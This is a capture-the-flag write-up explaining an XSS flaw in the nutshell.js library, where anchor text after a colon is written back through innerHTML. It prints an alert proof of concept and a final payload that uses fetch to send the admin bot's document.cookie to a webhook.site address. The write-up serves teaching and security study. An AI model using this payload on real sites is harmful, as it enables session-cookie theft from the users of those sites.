Objective:
+ exploit an XSS vulnerability on the web page and retrieve the admin cookie from the admin bot
+ a javascript library imported called 'nutshell.js'
+ source code of that library is available here:https://github.com/ncase/nutshell
+ the library used in the challenge was in the latest version, so here there was a zero-day

Solving:
+ we need to check if we have any gadgets with which we can exploit the xss vuln.(such as innerHTML)
+ After some analysis, from the source code of nutshell.js we can were able to find this : https://github.com/ncase/nutshell/blob/c182586d649153577b985dfd8dfab15e739130f6/nutshell.js#L607-L684
+ In the snippet of the source code provided, it can be observed that it retrieves all “a” tags in the DOM. Then, it creates a “span” element and removes the “:” character from the text using ex.innerText.slice(ex.innerText.indexOf(':')+1). Afterward, the modified text is assigned to linkText.innerHTML and appended to the “ex” element.
+ If we inject an HTML entity into an “a” tag that starts with “:”, it will be reappended to the “ex” element, allowing us to exploit an XSS vulnerability.
+ Simple payload
  ```
  <a>:&lt;img src=x onerror='alert(1)'/&gt;</a>
  ```
+ Yes we got an xss.
+ Now we can get the document.cookie easily by giving our webhook site
Final payload:
```
<a>:&lt;img src=x onerror='fetch("webhook.site/?"+document.cookie)'/&gt;</a>
```
Thus we get the flag.



Reference:
+ https://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss
+ https://github.com/ncase/nutshell
+ https://ncase.me/nutshell/
+ https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Named%20entities')&input=PGltZyBzcmM9eCBvbmVycm9yPSdhbGVydCgxKScvPg
